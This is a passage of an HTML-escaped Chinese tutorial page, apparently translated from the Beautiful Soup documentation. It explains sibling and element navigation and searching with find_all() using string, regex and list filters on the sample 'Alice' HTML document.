&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;link = soup.a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;link&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;link.next_sibling&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;,\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第二个&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签是顿号的 &lt;code&gt;.next_sibling&lt;/code&gt; 属性:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;link.next_sibling.next_sibling&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;next-siblings-和-previous-siblings&quot;&gt;&lt;a href=&quot;#next-siblings-和-previous-siblings&quot; class=&quot;headerlink&quot; title=&quot;.next_siblings 和 .previous_siblings&quot;&gt;&lt;/a&gt;.next_siblings 和 .previous_siblings&lt;/h3&gt;&lt;p&gt;通过 &lt;code&gt;.next_siblings&lt;/code&gt; 和 &lt;code&gt;.previous_siblings&lt;/code&gt; 属性可以对当前节点的兄弟节点迭代输出:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;for sibling in soup.a.next_siblings:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(repr(sibling))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;,\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos; and\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;; and they lived at the bottom of a well.&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # None&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;for sibling in soup.find(id=&amp;quot;link3&amp;quot;).previous_siblings:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(repr(sibling))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # &amp;apos; and\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;,\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # u&amp;apos;Once upon a time there were three little sisters; and their names were\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # None&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;回退和前进&quot;&gt;&lt;a href=&quot;#回退和前进&quot; class=&quot;headerlink&quot; title=&quot;回退和前进&quot;&gt;&lt;/a&gt;回退和前进&lt;/h2&gt;&lt;p&gt;看一下“爱丽丝” 文档:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;p class=&amp;quot;title&amp;quot;&amp;gt;&amp;lt;b&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;HTML解析器把这段字符串转换成一连串的事件: “打开&lt;code&gt;&amp;lt;html&amp;gt;&lt;/code&gt;标签”,”打开一个&lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt;标签”,”打开一个&lt;code&gt;&amp;lt;title&amp;gt;&lt;/code&gt;标签”,”添加一段字符串”,”关闭&lt;code&gt;&amp;lt;title&amp;gt;&lt;/code&gt;标签”,”打开&lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt;标签”,等等.Beautiful Soup提供了重现解析器初始化过程的方法.&lt;/p&gt;
&lt;h3 id=&quot;next-element-和-previous-element&quot;&gt;&lt;a href=&quot;#next-element-和-previous-element&quot; class=&quot;headerlink&quot; title=&quot;.next_element 和 .previous_element&quot;&gt;&lt;/a&gt;.next_element 和 .previous_element&lt;/h3&gt;&lt;p&gt;&lt;code&gt;.next_element&lt;/code&gt; 属性指向解析过程中下一个被解析的对象(字符串或tag),结果可能与 &lt;code&gt;.next_sibling&lt;/code&gt; 相同,但通常是不一样的.&lt;/p&gt;
&lt;p&gt;这是“爱丽丝”文档中最后一个&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签,它的 &lt;code&gt;.next_sibling&lt;/code&gt; 结果是一个字符串,因为当前的解析过程 [2] 因为当前的解析过程因为遇到了&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签而中断了:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;last_a_tag = soup.find(&amp;quot;a&amp;quot;, id=&amp;quot;link3&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;last_a_tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;last_a_tag.next_sibling&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;apos;; and they lived at the bottom of a well.&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但这个&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签的 &lt;code&gt;.next_element&lt;/code&gt; 属性结果是在&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签被解析之后的解析内容,不是&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签后的句子部分,应该是字符串”Tillie”:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;last_a_tag.next_element&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;Tillie&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这是因为在原始文档中,字符串“Tillie” 在分号前出现,解析器先进入&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签,然后是字符串“Tillie”,然后关闭&lt;code&gt;&amp;lt;/a&amp;gt;&lt;/code&gt;标签,然后是分号和剩余部分.分号与&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签在同一层级,但是字符串“Tillie”会被先解析.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.previous_element&lt;/code&gt; 属性刚好与 &lt;code&gt;.next_element&lt;/code&gt; 相反,它指向当前被解析的对象的前一个解析对象:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;last_a_tag.previous_element&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos; and\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;last_a_tag.previous_element.next_element&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;next-elements-和-previous-elements&quot;&gt;&lt;a href=&quot;#next-elements-和-previous-elements&quot; class=&quot;headerlink&quot; title=&quot;.next_elements 和 .previous_elements&quot;&gt;&lt;/a&gt;.next_elements 和 .previous_elements&lt;/h3&gt;&lt;p&gt;通过 &lt;code&gt;.next_elements&lt;/code&gt; 和 &lt;code&gt;.previous_elements&lt;/code&gt; 的迭代器就可以向前或向后访问文档的解析内容,就好像文档正在被解析一样:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;for element in last_a_tag.next_elements:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(repr(element))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;Tillie&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;;\nand they lived at the bottom of a well.&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;\n\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;p class=&amp;quot;story&amp;quot;&amp;gt;...&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;...&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# None&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;搜索文档树&quot;&gt;&lt;a href=&quot;#搜索文档树&quot; class=&quot;headerlink&quot; title=&quot;搜索文档树&quot;&gt;&lt;/a&gt;搜索文档树&lt;/h1&gt;&lt;p&gt;Beautiful Soup定义了很多搜索方法,这里着重介绍2个: &lt;code&gt;find()&lt;/code&gt; 和 &lt;code&gt;find_all()&lt;/code&gt; .其它方法的参数和用法类似,请读者举一反三.&lt;/p&gt;
&lt;p&gt;再以“爱丽丝”文档作为例子:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;html_doc = &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;p class=&amp;quot;title&amp;quot;&amp;gt;&amp;lt;b&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;p class=&amp;quot;story&amp;quot;&amp;gt;Once upon a time there were three little sisters; and their names were&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;a href=&amp;quot;http://example.com/elsie&amp;quot; class=&amp;quot;sister&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;a href=&amp;quot;http://example.com/lacie&amp;quot; class=&amp;quot;sister&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt; and&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;a href=&amp;quot;http://example.com/tillie&amp;quot; class=&amp;quot;sister&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;and they lived at the bottom of a well.&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;p class=&amp;quot;story&amp;quot;&amp;gt;...&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;from bs4 import BeautifulSoup&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(html_doc)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用 &lt;code&gt;find_all()&lt;/code&gt; 类似的方法可以查找到想要查找的文档内容&lt;/p&gt;
&lt;h2 id=&quot;过滤器&quot;&gt;&lt;a href=&quot;#过滤器&quot; class=&quot;headerlink&quot; title=&quot;过滤器&quot;&gt;&lt;/a&gt;过滤器&lt;/h2&gt;&lt;p&gt;介绍 &lt;code&gt;find_all()&lt;/code&gt; 方法前,先介绍一下过滤器的类型 [3] ,这些过滤器贯穿整个搜索的API.过滤器可以被用在tag的name中,节点的属性中,字符串中或他们的混合中.&lt;/p&gt;
&lt;h3 id=&quot;字符串&quot;&gt;&lt;a href=&quot;#字符串&quot; class=&quot;headerlink&quot; title=&quot;字符串&quot;&gt;&lt;/a&gt;字符串&lt;/h3&gt;&lt;p&gt;最简单的过滤器是字符串.在搜索方法中传入一个字符串参数,Beautiful Soup会查找与字符串完整匹配的内容,下面的例子用于查找文档中所有的&lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt;标签:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(&amp;apos;b&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;b&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/b&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果传入字节码参数,Beautiful Soup会当作UTF-8编码,可以传入一段Unicode 编码来避免Beautiful Soup解析编码出错&lt;/p&gt;
&lt;h3 id=&quot;正则表达式&quot;&gt;&lt;a href=&quot;#正则表达式&quot; class=&quot;headerlink&quot; title=&quot;正则表达式&quot;&gt;&lt;/a&gt;正则表达式&lt;/h3&gt;&lt;p&gt;如果传入正则表达式作为参数,Beautiful Soup会通过正则表达式的 &lt;code&gt;match()&lt;/code&gt; 来匹配内容.下面例子中找出所有以b开头的标签,这表示&lt;code&gt;&amp;lt;body&amp;gt;&lt;/code&gt;和&lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt;标签都应该被找到:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;import re&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;for tag in soup.find_all(re.compile(&amp;quot;^b&amp;quot;)):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(tag.name)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# body&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# b&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面代码找出所有名字中包含”t”的标签:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;for tag in soup.find_all(re.compile(&amp;quot;t&amp;quot;)):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(tag.name)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# html&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# title&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;列表&quot;&gt;&lt;a href=&quot;#列表&quot; class=&quot;headerlink&quot; title=&quot;列表&quot;&gt;&lt;/a&gt;列表&lt;/h3&gt;&lt;p&gt;如果传入列表参数,Beautiful Soup会将与列表中任一元素匹配的内容返回.下面代码找到文档中所有&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签和&lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt;标签:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all([&amp;quot;a&amp;quot;, &amp;quot;b&amp;quot;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;b&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/b&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
